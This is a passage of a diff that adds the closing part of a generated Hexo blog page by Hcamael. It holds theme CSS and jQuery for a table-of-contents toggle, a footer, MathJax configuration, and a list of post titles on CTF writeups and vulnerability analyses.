+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/06/27/0x1D/" title="上一篇: 寻找来自星星的你第二期Writeup">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/05/10/0x1B/" title="下一篇: SCTF Code Writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/23/0x33/">ROP小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/05/0x32/">Triton学习笔记(三)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/03/0x31/">Triton学习笔记(二)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/02/0x30/">Triton学习笔记(一)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/20/0x2f/">记一次手撸CPython bytecode</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/17/0x2e/">填坑</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/14/0x2d/">栈溢出之绕过CANARY保护</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/0x2c/">Linux系统下格式化字符串利用研究</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/17/0x2b/">Pwnhub之深入敌后writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/06/0x2a/">CVE-2016-6313 随机数预测分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/0x29/">phpmailer RCE 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/28/0x28/">2016 HCTF Crypto 出题总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/0x27/">PWN学习总结之基础栈溢出2</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/03/0x26/">PWN学习总结之基础栈溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/14/0x24/">HITCON 2016 web 总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/12/0x23/">2016 HITCON Crypto -- PAKE(++)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/13/0x22/">php bugs 72663分析(CVE-2016-7124)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/31/0x21/">Cisco ASA RCE 环境搭建</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/16/0x20/">LNMP + phpenv 实现不同虚拟主机使用不同版本的PHP</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/10/0x1F/">CVE-2016-6174漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/07/14/0x1E/">三个白帽之火币网2W大挑战</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/27/0x1D/">寻找来自星星的你第二期Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/17/0x1C/">三个白帽之招聘又开始了，你怕了吗？-Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/10/0x1B/">SCTF Code Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/05/03/0x1A/">GGCTF的对称密码学</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/17/0x19/">How old are Crypto?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/08/0x18/">MySQLi-Error Injection</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/04/0x17/">Python 使用dpkt分析数据包</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/01/0x16/">CRYPTO技能修正</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/21/0x15/">Pentester Lab Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/17/0x14/">0CTF RSA?总结 || RSA学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/15/0x13/">This is AliCTF?</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/14/0x12/">0CTF总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/03/07/0x11/">unholy Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/14/0x0F/">Nebula Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/19/0x0E/">12.19网络方向培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/08/0x0D/">HCTF之Black-Eat-Black总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/01/0x0C/">Python 的 BaseHTTPServer模块分析小结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/31/0x0B/">10.31新生培训</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/05/0x09/">不使用select情况下的各种盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/10/03/0x08/">2015XDCTF低分web题writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/08/07/0x06/">WeChall Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/22/0x04/">git小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x02/">对于硬盘事件的随想</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x01/">对于这次硬盘坏掉事件小记</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/19/0x00/">跳转到以前的博文</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2017 Hcamael
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题">Yelee</a> by MOxFIVE
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.1.22/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 4;
+                var backgroundimg = "url(http://qn.lazysheep.cc/bg/bg-xxxx.jpg)".replace(/xxxx/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+
+    <script src="//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js"></script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
